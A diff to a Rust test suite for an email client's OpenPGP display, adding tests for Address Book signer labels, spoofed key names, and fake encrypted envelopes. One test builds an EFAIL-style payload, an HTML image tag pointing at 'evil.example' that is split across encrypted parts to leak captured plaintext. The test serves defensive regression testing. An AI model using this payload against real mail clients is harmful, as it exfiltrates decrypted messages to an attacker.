@@ -60,6 +60,13 @@ fn world(name: &str) -> World {
     let mallory = pe_pgp::generate("Mallory", &["mallory@example.net".into()], now() - 60).unwrap();
     core.pgp_import(alice.cert().armored().as_bytes(), None, KeySource::Paste)
         .unwrap();
+    // Alice is in the Address Book: the labels name her by its name
+    core.save_card(&pe_store::Card {
+        name: "Alice Example".into(),
+        addresses: vec!["alice@example.org".into()],
+        ..Default::default()
+    })
+    .unwrap();
     World {
         core,
         dir,
@@ -159,7 +166,7 @@ fn signed_by_the_sender() {
     let protection = view.protection.as_ref().unwrap();
     assert_eq!(protection.tone, Tone::Good, "{protection:?}");
     assert!(
-        protection.text.contains("Alice <alice@example.org>"),
+        protection.text.contains("Signed by Alice Example"),
         "{}",
         protection.text
     );
@@ -429,4 +436,63 @@ fn a_reply_quotes_what_was_shown_and_forwards_carry_the_decrypted_files() {
     // saved from the reading pane, the attachment is the decrypted one
     let (name, content) = w.core.file_attachment(&file, 0).unwrap().unwrap();
     assert_eq!((name.as_str(), content.as_slice()), ("plan.pdf", &b"%PDF-1.4"[..]));
+}
+
+/// A key names itself as it likes: the label says the Address Book's name of the address checked, else the address
+#[test]
+fn a_key_name_never_reaches_the_label() {
+    let w = world("pgp-key-name");
+    let mallory = pe_pgp::generate("Mallory (key verified)", &["mallory@example.net".into()], now() - 60).unwrap();
+    w.core
+        .pgp_import(mallory.cert().armored().as_bytes(), None, KeySource::Paste)
+        .unwrap();
+    let raw = message("mallory@example.net", &signed_part(&text("Trust me"), &mallory, "s"));
+    let view = w.view(&raw);
+    let text = &view.protection.as_ref().unwrap().text;
+    assert!(
+        text.contains("mallory@example.net") && !text.contains("key verified)"),
+        "{text}"
+    );
+}
+
+/// Parts encrypted to the user by someone else, around a ciphertext they captured: each its own document, so their
+/// markup can not carry the captured plaintext away (EFAIL with encrypted neighbours)
+#[test]
+fn efail_encrypted_neighbours_are_documents_of_their_own() {
+    let w = world("pgp-efail-encrypted");
+    let html = |body: &str| format!("Content-Type: text/html; charset=utf-8\r\n\r\n{body}");
+    let open = encrypted_part(&html("<img src=\"https://evil.example/?x="), &[&w.me], None, "a");
+    let captured = encrypted_part(&text("The secret plan"), &[&w.me], None, "b");
+    let close = encrypted_part(&html("\">"), &[&w.me], None, "c");
+    let raw = message("mallory@example.net", &mixed(&[open, captured, close]));
+    let view = w.view(&raw);
+    let protection = view.protection.as_ref().unwrap();
+    assert_eq!(protection.parts.len(), 3, "{protection:?}");
+    // the secret is drawn as text of its own document, never inside another's attribute
+    assert!(view.document.contains("The secret plan"));
+    assert!(!view.document.contains("x=The secret plan") && !view.document.contains("x=\nThe secret"));
+}
+
+/// A "multipart/encrypted" holding OpenPGP data that is not encrypted (a literal data packet here; a signed message
+/// someone wrote to another, in an envelope that only looks encrypted): no encryption, and not shown
+#[test]
+fn an_envelope_with_nothing_encrypted_is_broken() {
+    let w = world("pgp-not-encrypted");
+    let data = b"Content-Type: text/plain\r\n\r\nHi Mallory";
+    // a literal data packet (RFC 9580 5.9), new format: binary, no file name, no date
+    let mut packet = vec![0xCB, (6 + data.len()) as u8, b'b', 0, 0, 0, 0, 0];
+    packet.extend_from_slice(data);
+    let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &packet);
+    let raw = message(
+        "alice@example.org",
+        &format!(
+            "Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"e\"\r\n\r\n\
+             --e\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--e\r\n\
+             Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: base64\r\n\r\n{encoded}\r\n--e--\r\n"
+        ),
+    );
+    let view = w.view(&raw);
+    let protection = view.protection.as_ref().unwrap();
+    assert_eq!(protection.tone, Tone::Warning, "{protection:?}");
+    assert!(!view.document.contains("Hi Mallory"));
 }
